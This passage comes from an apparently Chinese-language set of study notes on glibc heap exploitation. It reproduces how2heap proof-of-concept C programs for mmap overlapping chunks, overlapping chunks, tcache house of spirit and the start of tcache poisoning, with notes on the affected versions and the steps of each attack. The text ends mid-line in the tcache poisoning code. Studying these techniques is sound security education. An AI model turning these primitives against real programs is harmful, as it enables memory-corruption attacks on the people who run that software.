<h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><p>malloc的内存通过vmmap可以查看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">技术应适用于所有版本的 GLibC</span></span><br><span class="line"><span class="comment">编译命令：`gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC 由 Maxwell Dulin（Strikeout）编写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	关于 GLibC 中的 Mmap 块的简介</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	在 GLibC 中，存在一个点，当分配的内存块过大时，malloc 决定需要为其分配一个单独的内存区域，而不是在正常堆上分配。这是由 mmap_threshold 变量决定的。</span></span><br><span class="line"><span class="comment">	此时，使用系统调用 *Mmap* 来分配一段虚拟内存并返回给用户。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	类似地，释放过程也会有所不同。释放的块不会被返回给一个 bin 或堆的其余部分，而是使用另一个系统调用：*Munmap*。这个调用接受一个指向之前分配的 Mmap 块的指针，并将其释放回内核。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块在大小元数据上设置了特殊的位：第二位。如果该位被设置，则表示该块是作为 Mmap 块分配的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap 块有 prev_size 和 size。*size* 表示块的当前大小。块的 *prev_size* 表示 Mmap 块的剩余空间（不是直接下方块的大小）。</span></span><br><span class="line"><span class="comment">	然而，fd 和 bk 指针并未使用，因为 Mmap 块不会回到 bins 中，正如 GLibC Malloc 中的大多数堆块一样。释放时，块的大小必须按照页面对齐。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	下面的 POC 实际上是对 mmap 块的重叠块攻击。这与 https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c 非常相似。</span></span><br><span class="line"><span class="comment">	主要区别在于 mmapped 块具有特殊的属性，并以不同的方式处理，导致与正常重叠块攻击不同的攻击场景。</span></span><br><span class="line"><span class="comment">	还可以执行其他操作，例如 munmapping 系统库、堆本身等。</span></span><br><span class="line"><span class="comment">	这只是一个简单的概念验证，旨在演示对 mmap 块进行攻击的一般方式。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	有关 GLibC 中 mmap 块的更多信息，请阅读这篇文章：</span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">           <span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">           <span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">    );</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	assert(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line"></span><br><span class="line">	_exit(<span class="number">0</span>); <span class="comment">// exit early just in case we corrupted some libraries</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping_chunk"></a>overlapping_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nThis is another simple chunks overlapping problem\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;and the prev_size of it must match the unsortedbin&#x27;s size\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s start to allocate 4 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x581</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x580</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		   <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>((<span class="type">char</span> *)p4, (<span class="type">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li>申请3个chunk p1,p2,p3 对应size: 0x80 0x500 0x80</li>
<li>通过溢出修改p2的size为0x581，此时p3被包含进了p2，形成了堆重叠</li>
<li>free(p2)，p3的内存会随p2一起释放掉</li>
<li>申请 0x580-0x8 大小的chunk，即p4</li>
<li>p4实质就是p2和p3合并的chunk，我们可以通过p4对p3写内容或操作</li>
</ul>
<h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>可以通过overlapping_chunk将一个 used chunk 合并到free chunk（也可以是topchunk）中，再将它申请出来就可以实现任意地址分配</p>
<h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>效果：tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>址</p>
<h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li><p>这个demo演示了house of spirit在tcache上</p>
</li>
<li><p>首先malloc(1)</p>
</li>
<li><p>接着我们在栈上伪造个chunk，size为0x40。因为在tcache_put()中没有对下一个chunk的size进行检查，所以不需要伪造下一个chunk</p>
</li>
<li><p>然后我们free这个chunk，再将其申请出来即可得到伪造的chunk，若为我们还伪造了它的fd，就可以申请其他的地</p>
</li>
</ul>
<h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><p>分配一个chunk到栈上</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>效果：任意地址分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span 